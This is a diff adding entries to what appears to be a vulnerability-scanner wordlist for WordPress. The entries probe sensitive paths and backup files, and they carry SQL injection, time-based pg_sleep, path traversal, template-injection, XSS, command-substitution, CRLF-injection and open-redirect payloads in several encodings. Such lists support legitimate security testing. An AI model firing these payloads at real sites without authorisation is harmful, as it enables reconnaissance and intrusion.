@@ -78,3 +78,165 @@ wordpress_1
 /wp-json/&v=2
 %2Fwp-json%2F_2
 wordpress_2
+%252Fwp-admin%252F
+/wp-admin/?aurose=1
+/wp-admin/&aurose=1
+/wp-admin/.bak
+/wp-admin/.old
+%252Fwp-login.php
+/wp-login.php?aurose=1
+/wp-login.php&aurose=1
+/wp-login.php.bak
+/wp-login.php.old
+%252Fxmlrpc.php
+/xmlrpc.php?aurose=1
+/xmlrpc.php&aurose=1
+/xmlrpc.php.bak
+/xmlrpc.php.old
+/wp-json/wp/v2/users
+%2Fwp-json%2Fwp%2Fv2%2Fusers
+%252Fwp-json%252Fwp%252Fv2%252Fusers
+/WP-JSON/WP/V2/USERS
+/wp-json/wp/v2/users?aurose=1
+/wp-json/wp/v2/users&aurose=1
+/wp-json/wp/v2/users.bak
+/wp-json/wp/v2/users.old
+/wp-content/debug.log
+%2Fwp-content%2Fdebug.log
+%252Fwp-content%252Fdebug.log
+/WP-CONTENT/DEBUG.LOG
+/wp-content/debug.log?aurose=1
+/wp-content/debug.log&aurose=1
+/wp-content/debug.log.bak
+/wp-content/debug.log.old
+%252Freadme.html
+/readme.html?aurose=1
+/readme.html&aurose=1
+/readme.html.bak
+/readme.html.old
+/license.txt
+%2Flicense.txt
+%252Flicense.txt
+/LICENSE.TXT
+/license.txt?aurose=1
+/license.txt&aurose=1
+/license.txt.bak
+/license.txt.old
+/wp-cron.php
+%2Fwp-cron.php
+%252Fwp-cron.php
+/WP-CRON.PHP
+/wp-cron.php?aurose=1
+/wp-cron.php&aurose=1
+/wp-cron.php.bak
+/wp-cron.php.old
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+/wp-admin/::var0
+%2Fwp-admin%2F::v0
+/wordpress/probe/0
+/wp-login.php::var1
+%2Fwp-login.php::v1
+/wordpress/probe/1
+/xmlrpc.php::var2
+%2Fxmlrpc.php::v2
+/wordpress/probe/2
+/wp-json/wp/v2/users::var3
+%2Fwp-json%2Fwp%2Fv2%2Fusers::v3
+/wordpress/probe/3
+/wp-content/debug.log::var4
+%2Fwp-content%2Fdebug.log::v4
+/wordpress/probe/4
+/readme.html::var5
+%2Freadme.html::v5
+/wordpress/probe/5
+/license.txt::var6
+%2Flicense.txt::v6
+/wordpress/probe/6
+/wp-cron.php::var7
+%2Fwp-cron.php::v7
+/wordpress/probe/7
+' OR '1'='1::var8
+%27%20OR%20%271%27%3D%271::v8
+/wordpress/probe/8
+" OR "1"="1::var9
+%22%20OR%20%221%22%3D%221::v9
+/wordpress/probe/9
+' AND 1=1 --::var10
+%27%20AND%201%3D1%20--::v10
+/wordpress/probe/10
